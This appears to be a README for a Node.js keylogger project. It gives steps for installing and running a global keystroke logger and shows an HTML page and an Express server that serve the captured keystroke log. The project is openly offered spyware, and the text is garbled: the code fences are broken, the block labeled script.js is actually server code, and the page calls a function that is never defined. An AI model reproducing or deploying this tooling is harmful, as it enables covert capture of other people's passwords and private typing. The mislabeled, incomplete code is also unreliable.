# Keylogger software with Web Interface

This project is a keylogger built using Node.js that logs keyboard events and provides a simple web interface to view the logs in real-time.

## Features

- Captures global keyboard events.
- Logs keystrokes to a file.
- Provides a web interface to view the logs.

## Prerequisites

- Node.js (version 12 or higher)
- npm (Node package manager)

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/yourusername/keylogger-web-interface.git
   cd keylogger-web-interface
# 2.Install the dependencies:
npm install node-global-key-listener

# Usage:
# 1. Start the Keylogger:
node keylogger.js

# 2. Start the Web Server:
node server.js

# 3.Access the Interface:
Open your web browser and navigate to "http://localhost:3000" to view the logged keys.

# File Structure
project-folder/
├── keylogger.js       # Captures and logs keystrokes
├── server.js          # Serves the web interface and logs
├── package.json       # Node.js project file
└── public/
    ├── index.html     # Web interface HTML
    └── script.js      # JavaScript for fetching and displaying logs
# index.html:
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Keylogger Interface</title>
  <style>
    body { font-family: Arial, sans-serif; }
    #log { white-space: pre; background: #f0f0f0; padding: 10px; border: 1px solid #ccc; }
  </style>
</head>
<body>
  <h1>Keylogger Interface</h1>
  <button onclick="fetchLogs()">Refresh Logs</button>
  <div id="log">Logs will appear here...</div>

  <script src="script.js"></script>
</body>
</html>

# script.js:
'use strict';
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 3000;
const logFile = 'keylogs.txt';

// Serve the static files
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to fetch the logs
app.get('/logs', (req, res) => {
  fs.readFile(logFile, 'utf8', (err, data) => {
    if (err) {
      res.status(500).send('Error reading log file');
    } else {
      res.send(data);
    }
  });
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
